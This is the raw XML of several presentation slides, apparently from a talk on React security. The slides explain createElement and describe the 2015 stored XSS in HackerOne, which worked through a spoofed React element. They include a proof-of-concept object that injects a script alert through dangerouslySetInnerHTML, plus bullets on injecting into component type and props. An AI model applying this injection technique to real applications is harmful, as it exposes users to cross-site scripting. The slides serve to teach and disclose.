                        <a:t>createElement</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>(</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>  'h1'</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>,                        //type</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                      </a:b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a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0" err="1">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>className</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'greeting'</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>},     //[props]</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>  'Hello</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world</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>!</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>'</a:t>
                      </a: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//[children]</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>);</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="20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86062677"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4142001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Dynamically Created Components – Part I</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="5" name="Table 4"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3493630166"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="828685" y="1750237"/>
          <a:ext cx="7832651" cy="1054384"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="7832651">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="320404432"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="638777">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0" err="1">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>attacker_payload</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err="1">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>JSON</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parse</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some_user_input</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render</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&lt;</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>span</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>&gt;{</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0" err="1">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>attacker_payload</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>}&lt;/</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>span</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>&gt;;</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                      </a:b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1930748722"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Content Placeholder 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="828685" y="1395078"/>
            <a:ext cx="10972800" cy="367243"/>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sz="1800" dirty="0"/>
              <a:t>March 2015 – stored XSS in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>HackerOne</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> itself - by Daniel </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>LeCheminant</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="7" name="Table 6"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3964102695"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="828685" y="3315849"/>
          <a:ext cx="7832651" cy="2761264"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="7832651">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1992347001"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="1534381">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>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_</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0" err="1">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>isReactElement</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0000FF"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>true</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_store</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type</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"body"</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props</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err="1">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>dangerouslySetInnerHTML</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__html</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"&lt;script&gt;alert('No CSP Support :(')&lt;/script&gt;"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944833145"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Content Placeholder 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="828685" y="2875811"/>
            <a:ext cx="10972800" cy="425455"/>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sz="1800" dirty="0"/>
              <a:t>Submit a React object with “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>dangerouslySetInnerHTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>()” field with __html attribute:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9035784" y="4876800"/>
            <a:ext cx="2765701" cy="1200312"/>
          </a:xfrm>
          <a:ln>
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Fixed in React 0.14 </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>(Nov 2015): plain text objects are no longer supported.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="TextBox 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4169268" y="6091696"/>
            <a:ext cx="4549643" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>http://danlec.com/blog/xss-via-a-spoofed-react-element</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="135856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uiExpand="1" build="p"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Dynamically Created Components – Part II</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="3119398"/>
            <a:ext cx="10972800" cy="3111281"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Injecting into the type:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Create an arbitrary React component</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>No attributes (event handlers, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>href</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, style)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Injecting into props:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Use “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>dangerouslySetInnerHTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>” property</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240659769"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="609600" y="1211574"/>
          <a:ext cx="6319284" cy="1907824"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="6319284">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="556568719"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="1422430">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" i="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>// </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" i="1" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>Transpiled</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" i="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t> to JavaScript </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="0000FF"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>const</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t> element </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a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0" err="1">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>React</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>.</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="0000FF"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>createElement</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>(</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>  </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                          <a:effectLst/>
                          <a:highlight>
                            <a:srgbClr val="FFFF00"/>
                          </a:highlight>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>'h1'</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>,                        //type</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                      </a:b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a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0" err="1">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>className</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'greeting'</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>},     //[props]</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>  'Hello</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world</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>!</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>'</a:t>
                      </a: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//[children]</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>);</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="20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8606267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32696305"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="609600" y="1220948"/>
          <a:ext cx="6319284" cy="1907824"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="6319284">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="556568719"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="1422430">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" i="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>// </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" i="1" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>Transpiled</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" i="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t> to JavaScript </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="0000FF"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>const</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t> element </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a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0" err="1">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>React</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>.</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="0000FF"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>createElement</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>(</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>  'h1'</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>,                        //type</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>  </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:highlight>
                            <a:srgbClr val="FFFF00"/>
                          </a:highlight>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>{</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                          <a:effectLst/>
                          <a:highlight>
                            <a:srgbClr val="FFFF00"/>
                          </a:highlight>
